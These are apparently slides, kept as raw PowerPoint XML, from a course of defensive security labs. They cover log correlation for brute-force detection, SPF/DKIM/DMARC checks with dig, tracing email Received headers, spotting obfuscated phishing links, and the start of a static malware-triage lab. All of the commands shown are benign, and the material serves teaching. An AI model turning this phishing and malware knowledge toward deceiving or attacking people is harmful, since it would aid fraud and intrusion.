          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4064508"/>
            <a:ext cx="5486400" cy="2153412"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 7: Build a one-line "detection rule"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Any IP printed is on both sides — failed AND succeeded.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="4866894"/>
            <a:ext cx="3977639" cy="5486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52360" y="4866894"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ join -1 1 -2 1 \</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300</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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7 — What You Learned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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  By completing this lab you can:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Parse, aggregate, and correlate logs across multiple sources.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Build a brute-force-then-success detection by hand — the algorithm under every SIEM "use case".</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Work with both unstructured syslog and structured JSON events.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Move from raw log to actionable alert without leaving the shell.</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301</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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8 — Email Header Analysis (SPF/DKIM/DMARC)</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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Objective</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  In this lab you will analyse an email header for impersonation indicators and inspect the three authentication standards — SPF, DKIM, and DMARC — that determine whether a sender is forging the From address. These are exam-blueprint items under CySA+ 1.3 (Email analysis — Header, Impersonation, DKIM, DMARC, SPF,…</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Environment: Killercoda + Web (MXToolbox)</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302</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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1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8 — Hands-On Steps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78455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78455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05840" y="194675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1946757"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 1: Install DNS tools</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="1901037"/>
            <a:ext cx="3977639" cy="5486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52360" y="1901037"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ apt update &amp;&amp; apt install -y dnsutils</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2695651"/>
            <a:ext cx="10634472" cy="78455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2695651"/>
            <a:ext cx="91440" cy="78455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005840" y="285932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2859328"/>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8" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="2695651"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 2: Look up an SPF record</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>SPF lists the IPs/hosts allowed to send mail for a domain.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="2813608"/>
            <a:ext cx="3977639" cy="5486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52360" y="2813608"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ dig +short TXT google.com | grep spf1</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Rectangle 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3608222"/>
            <a:ext cx="10634472" cy="78455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3608222"/>
            <a:ext cx="91440" cy="78455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005840" y="3771899"/>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05840" y="3771899"/>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5" name="TextBox 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="3608222"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 3: Look up DKIM and DMARC</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>DKIM signatures live at a selector subdomain (e.g.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Rectangle 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="3726179"/>
            <a:ext cx="3977639" cy="5486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52360" y="3726179"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ dig +short TXT _dmarc.google.com</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Rectangle 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4520793"/>
            <a:ext cx="10634472" cy="78455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77240" y="4520793"/>
            <a:ext cx="91440" cy="78455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1005840" y="468447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05840" y="4684470"/>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32" name="TextBox 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4520793"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 4: Analyse a suspicious raw header</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Save the following spear-phishing-style header:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Rectangle 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="4638750"/>
            <a:ext cx="3977639" cy="5486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452360" y="4638750"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ cat &gt; /tmp/header.eml &lt;&lt;'EOF'</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Rectangle 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5433364"/>
            <a:ext cx="10634472" cy="78455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77240" y="5433364"/>
            <a:ext cx="91440" cy="78455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05840" y="5597041"/>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05840" y="5597041"/>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5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="TextBox 38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="5433364"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 5: Trace the Received chain to find the true origin</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Received headers are stacked top-down; the lowest one is the original.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Rectangle 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="5551321"/>
            <a:ext cx="3977639" cy="5486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452360" y="5551321"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ tac /tmp/header.eml | grep -E '^Received'</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303</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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1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8 — Hands-On Steps (cont'd)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21534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1534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05840" y="263118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2631186"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="5486400" cy="2153412"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 6: Check embedded links (CySA+ "Obfuscated links")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Phish emails hide the real destination behind plausible link text.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="2585466"/>
            <a:ext cx="3977639" cy="5486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52360" y="2585466"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ cat &gt; /tmp/body.txt &lt;&lt;'EOF'</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4064508"/>
            <a:ext cx="10634472" cy="21534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4064508"/>
            <a:ext cx="91440" cy="21534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005840" y="4912614"/>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4912614"/>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8" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4064508"/>
            <a:ext cx="9509760" cy="2153412"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 7: Validate against a public service</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>For real triage, paste the full header into:</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304</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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8 — What You Learned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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  By completing this lab you can:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  How to query SPF, DKIM, and DMARC records with dig.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  How to read the Authentication-Results header to confirm forgery.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  How to trace the Received chain to the true sender IP.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  How to spot obfuscated / lookalike links in the email body.</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305</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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9 — Malware Triage with Hashing and VirusTotal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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Objective</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  In this lab you will perform first-pass static malware triage: identify the file type, hash it, extract printable strings, write a YARA rule, and submit the hash to VirusTotal. These are exam-blueprint items under CySA+ 1.3 (File analysis — Hashing, Strings, VirusTotal, Sandboxing).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Environment: Killercoda + Web (VirusTotal)</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306</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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9 — Reference Diagram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g_e8186f7ac6.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2363683" y="1783080"/>
            <a:ext cx="7461585" cy="4434840"/>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307</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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1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9 — Hands-On Steps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78455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78455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05840" y="194675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1946757"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 1: Install tools</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="1901037"/>
            <a:ext cx="3977639" cy="5486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52360" y="1901037"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
